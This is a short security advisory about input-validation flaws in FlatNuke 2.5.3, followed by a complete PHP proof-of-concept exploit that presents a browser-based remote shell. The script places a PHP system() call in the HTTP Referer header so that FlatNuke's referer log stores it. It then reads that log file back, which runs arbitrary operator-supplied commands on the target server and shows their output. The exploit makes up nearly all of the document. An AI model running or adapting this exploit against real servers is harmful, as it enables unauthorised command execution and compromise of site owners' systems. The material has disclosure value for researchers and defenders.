source: http://www.securityfocus.com/bid/13882/info
  
Multiple input validation vulnerabilities reportedly affect FlatNuke. These issues are due to a failure of the application to properly sanitize user-supplied input prior to using it in application-critical actions such as generating Web content or loading scripts.
  
An attacker may leverage these issues to execute arbitrary PHP code, execute client-side script code in the browsers of unsuspecting users through cross-site scripting attacks, and gain access to sensitive information. Other attacks are also possible. 

<?php
/*

  Flatnuke 2.5.3 Arbitrary Remote Command Injection Shell PoC
  
  Description: A simple PHP PoC script yielding a virtual remote shell
  Advisory: http://secwatch.org/advisories/secwatch/20050604_flatnuke.txt
  Original: http://secwatch.org/exploits/2005/06/flatnuke_shell.php.info
  Fixed version: FlatNuke 2.5.3
  Author: SW [at] secwatch [dot] co [dot] uk
  
  References:
  http://flatnuke.sourceforge.net/index.php?mod=read&id=1117979256

*/


/* start session */
session_start();
  
/* initialise session variables. */
if (empty($_SESSION['output']) || !empty($_POST['reset'])) {
  $_SESSION['history'] = array();
  $_SESSION['output'] = '';
  $_SESSION['cmdcnt'] = 0;
  $_SESSION['cwd'] = '/';
  for($len=8,$r=''; strlen($r)<$len; $r.=chr(!mt_rand(0,2)? mt_rand(48,57):(!mt_rand(0,1)?mt_rand(65,90):mt_rand (97,122))));
  $_SESSION['rand'] = $r; // rand string for this session only
}
  
if (!empty($_POST['CMD'])) {
  if (get_magic_quotes_gpc()) {
    $_POST['CMD'] = stripslashes($_POST['CMD']);
  }

  /* save current command in */
  if (($i = array_search($_POST['CMD'], $_SESSION['history'])) !== false)
    unset($_SESSION['history'][$i]);
    
  array_unshift($_SESSION['history'], $_POST['CMD']);
  $_SESSION['output'] .= '$ ' . $_POST['CMD'] . "\n";
}

/* initialise current directory. */
if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_POST['CMD'])) {
  $_SESSION['cwd'] = dirname(__FILE__);
} else if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_POST['CMD'], $regs)) {
  if ($regs[1][0] == '/') {
    $new_dir = $regs[1]; /* absolute path */
  } else {
    $new_dir = $_SESSION['cwd'] . '/' . $regs[1];/* relative path */
  }
  while (strpos($new_dir, '/./') !== false) $new_dir = str_replace('/./', '/', $new_dir); /* transform '/./' into '/' */
  while (strpos($new_dir, '//') !== false) $new_dir = str_replace('//', '/', $new_dir); /* transform '//' into '/' */
  while (preg_match('|/\.\.(?!\.)|', $new_dir)) $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir); /* transform 'x/..' into '' */
  $_SESSION['cwd'] = ($new_dir == '') ? "/" : $new_dir;
}

/* build the command history */
if (empty($_SESSION['history'])) {
  $js_command_hist = '""';
} else {
  $escaped = array_map('addslashes', $_SESSION['history']);
  $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
}
?>

<html>
 <head>
  <title>FlatNuke 2.5.3 Arbitrary Command Injection Shell PoC</title>
  <script type="text/javascript" language="JavaScript">
  var current_line = 0;
  var command_hist = new Array(<?php echo $js_command_hist ?>);
  var last = 0;

  function key(e) {
    if (!e) var e = window.event;

    if (e.keyCode == 38 && current_line < command_hist.length-1) {
      command_hist[current_line] = document.shell.CMD.value;
      current_line++;
      document.shell.CMD.value = command_hist[current_line];
    }

    if (e.keyCode == 40 && current_line > 0) {
      command_hist[current_line] = document.shell.CMD.value;
      current_line--;
      document.shell.CMD.value = command_hist[current_line];
    }
  }

  function init() {
    document.shell.setAttribute("autocomplete", "off");
    document.shell.output.scrollTop = document.shell.output.scrollHeight;
    document.shell.CMD.focus();
  }
  </script>  
  <style>
  textarea { 
    border: none;
    width: 100%;
    padding: 2px 2px 0px;
  }
  div {
    border: inset 2px white;
  } 
  p.prompt {
    font-family: monospace;
    margin: 0px;
    padding: 0px 2px 2px;
  }
  input.prompt {
    border: none;
    font-family: monospace;
  }   
  </style>
 </head>
 <body onload="init()">
   <p align="center"><center><h2>FlatNuke 2.5.3 Arbitrary Command Injection Shell PoC</h2></center></p><br />
   <form name="shell" method="POST" action="<? echo $_SERVER['PHP_SELF'] ?>">
     <table>
       <tr>
         <td>Host+Path:</td>
         <td><input type="text" name="URL" size="35" value="<? echo $_POST['URL'] ?>" /> (e.g http://site.com/path/to/flatnuke/ - note only path to flatnuke root directory)<br /></td>
       <tr>
       <tr>
         <td>Directory:</td>
         <td><?php echo $_SESSION['cwd']; ?></td>
       <tr>
     </table>
     <div>
   
<?php
/* tidy up request / set some defaults if not provided */
$urlbits = parse_url($_POST['URL']);
$host = ($urlbits['host'] != "") ? $urlbits['host'] : "";
$port = ($urlbits['port'] != "") ? $urlbits['port'] : 80;
$path = ($urlbits['path'] != "") ? $urlbits['path'] : "/flatnuke/";
$quer = ($urlbits['query'] != "") ? "?".$urlbits['query'] : "";
$cmd = ($_POST['CMD'] != "") ? addslashes("cd {$_SESSION['cwd']} && ".$_POST['CMD']) : "";
$reflog = $path."misc/flatstat/referer.php";
$int = $_SESSION['cmdcnt']++;
$referer = "http://noneexistantsite.com/?s{$_SESSION['rand']}$int=<?php system(\"$cmd\")?>&e{$_SESSION['rand']}$int";

/* ensure all required vars are present */
if (isset($_POST['URL']) && $host != "" && $cmd != "") { 

  /* connect to target */
  if (!$fp = fsockopen($host, $port, $errno, $errstr)) {
    echo "Cound not connect to <i>$host</i> ($errstr - $errno)<br/>\n";
  } else {
    /* make HTTP request */
    fputs($fp, "GET $path.$quer HTTP/1.1\r\n");
    fputs($fp, "Host: $host\r\n");
    fputs($fp, "Referer: $referer\r\n");
    fputs($fp, "Connection: close\r\n\r\n");
    fclose($fp);
    usleep(150000);
  
    /* retrieve command output */
    if ($result = file_get_contents("http://$host:$port$reflog")) {

      /* strip other irrelevant referer information */
      $trim = str_replace("http://noneexistantsite.com/?s{$_SESSION['rand']}$int=", "", stristr($result, "http://noneexistantsite.com/?s{$_SESSION['rand']}$int="));
      $trim = str_replace(stristr($trim, "&e{$_SESSION['rand']}$int"), "", $trim);

      /* display trimmed command output */
      $_SESSION['output'] .= htmlspecialchars($trim);
    }
  }
}
?>

   <textarea name="output" readonly="readonly" cols="90" rows="30">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, 36 - $lines));
echo rtrim($padding . $_SESSION['output']);
?>
   &lt;/textarea&gt;
   <p class="prompt">
     $&nbsp;<input class="prompt" type="text" name="CMD" size="78" onkeyup="key(event)" tabindex="1" />
   </p>
   </div><br /><br />
   <input type="submit" value="Execute" /> <input type="submit" name="reset" value="Reset" />
   </form>
 </body>
</html>